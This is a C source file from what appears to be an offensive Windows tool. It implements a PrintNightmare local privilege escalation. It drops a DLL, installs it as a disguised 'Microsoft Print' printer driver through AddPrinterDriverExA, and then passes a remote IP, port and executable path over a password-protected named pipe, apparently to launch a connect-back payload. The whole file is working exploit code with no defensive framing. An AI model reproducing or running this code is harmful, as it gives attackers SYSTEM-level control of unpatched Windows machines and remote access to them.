#include <windows.h>
#include <stdio.h>

#include "Tools.h"
#include "DllHijacking.h"
#include "Message.h"
#include "PipeServer.h"

#define DRIVER_INFO_LEVEL_2		2
#define DRIVER_NAME_SIZE		30


VOID GenRandDriverNamePrint(char* drivername){
	const char prefix[] = "Microsoft Print ";

	strcpy_s(drivername, DRIVER_NAME_SIZE, prefix);
	GenRandDriverName(drivername + sizeof(prefix), DRIVER_NAME_SIZE - sizeof(prefix));
	return;
}
VOID CreateDriverInfo(char* dllPath, DRIVER_INFO_2A* pInfo){
	// https://docs.microsoft.com/en-us/windows/win32/printdocs/driver-info-2
	char driverName[DRIVER_NAME_SIZE + 1];

	GenRandDriverNamePrint(driverName);
	pInfo->cVersion = 3;
	pInfo->pConfigFile = dllPath;
	pInfo->pDataFile = (char*)"C:\\Windows\\System32\\kernelbase.dll";
	pInfo->pDriverPath = NULL;
	pInfo->pEnvironment = NULL;
	pInfo->pName = driverName;
	printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Driver name: '%s'\n", driverName);
	return;
}

BOOL EnumPrinter(LPBYTE* pInfo){
	DWORD pcbNeeded = 0;
	DWORD numDriversExist = 0;
	EnumPrinterDriversA(NULL, NULL, 2, NULL, 0, &pcbNeeded, &numDriversExist);
	printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Drivers Count: %d\n", numDriversExist);

	*pInfo = (LPBYTE)malloc(pcbNeeded);
	if (*pInfo == NULL)
		return FALSE;

	//[Start find Printer Driver]
	if (!EnumPrinterDriversA(NULL, NULL, 2, *pInfo, pcbNeeded, &pcbNeeded, &numDriversExist)){
		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Find Printer Driver ERR");
		free(*pInfo);
		return FALSE;
	} else
		printMsg(STATUS_INFO2, LEVEL_DEFAULT, "Finding Printer Driver ok.\n");
	return TRUE;
}

BOOL PrintNightmareLPE(char* dllPath){
	DRIVER_INFO_2A info;
	LPBYTE pInfo = NULL;

	CreateDriverInfo(dllPath, &info);
	if (EnumPrinter(&pInfo)){
		DRIVER_INFO_6A* foundInfo = (DRIVER_INFO_6A*)pInfo;
		info.pDriverPath = foundInfo->pDriverPath;

		if (AddPrinterDriverExA(NULL, DRIVER_INFO_LEVEL_2, (PBYTE)&info, APD_COPY_ALL_FILES | APD_COPY_FROM_DIRECTORY | 0x8000)){
			printMsg(STATUS_OK2, LEVEL_DEFAULT, "New printer driver added\n");
			printMsg(STATUS_OK2, LEVEL_DEFAULT, "Done !!! All finished.\n");
			free(pInfo);
			return TRUE;
		} else{
			DWORD lastError = GetLastError();
			switch (lastError){
			case ERROR_PRINTER_DRIVER_BLOCKED:
				printf("[x] Error with AddPrinterDriverEx: PRINTER DRIVER BLOCKED \n");
				break;
			case ERROR_PRINTER_DRIVER_WARNED:
				printf("[x] Error with AddPrinterDriverEx: PRINTER DRIVER WARNED \n");
				break;
			default:
				printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Error with AddPrinterDriverEx");
				break;
			}
		}
		free(pInfo);
	}
	return FALSE;
}




BOOL ExploitPrintNightmareLPE(char* PathExeToRun, WCHAR* UipAddress, char* port, char* wincatDefaultDir){
	const char* dllName = "DriverPrinter.dll";

	/*if (!SaveRHostInfo(UipAddress, port)){
		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg (RHost)");
		return FALSE;
	}
	if (!SaveCPathInfo(PathExeToRun)){
		printMsg(STATUS_ERROR2, LEVEL_DEFAULT, "Fail to save info in reg (Path)");
		return FALSE;
	}*/

	if (DropDllFile(wincatDefaultDir, (char*)dllName)){
		char* dllPath = (char*)malloc(MAX_PATH);
		if (dllPath != NULL){
			sprintf_s(dllPath, MAX_PATH, "%s\\%s", wincatDefaultDir, dllName);
			if (PrintNightmareLPE(dllPath)){
				

				///////////////////// TEST /////////////////////
				//

				char* strIpAddress = (char*)malloc(IP_ADDRESS_SIZE + 1);
				if (strIpAddress != NULL){

					sprintf_s(strIpAddress, IP_ADDRESS_SIZE, "%ws", UipAddress);

					PipeDataStruct pipeDataStruct = {
						//.ipAddress = strIpAddress,
						.port = atoi(port),				// NOT OPTI !!!!
						.exploitStatus = FALSE,
						.pathExeToRun = PathExeToRun
					};
					const char* lpszPipename = "\\\\.\\pipe\\mynamedpipeLow";
					const char* password = "ekttKwf3PFzRCc9egZ5AKfd8FKvGjRu3DrHCTdwT5YKCk2dm9rSxByFzFNKb";

					strcpy_s(pipeDataStruct.ipAddress, IP_ADDRESS_SIZE, strIpAddress);


					SendInfoPipe(&pipeDataStruct, lpszPipename, password);

					printf("[-] Result:\n");
					printf("\t[+] Status: %i\n", pipeDataStruct.exploitStatus);

					free(strIpAddress);
					free(dllPath);
					return TRUE;
				}

				//
				///////////////////// TEST /////////////////////

			}
			free(dllPath);
		}

	}
	return FALSE;
}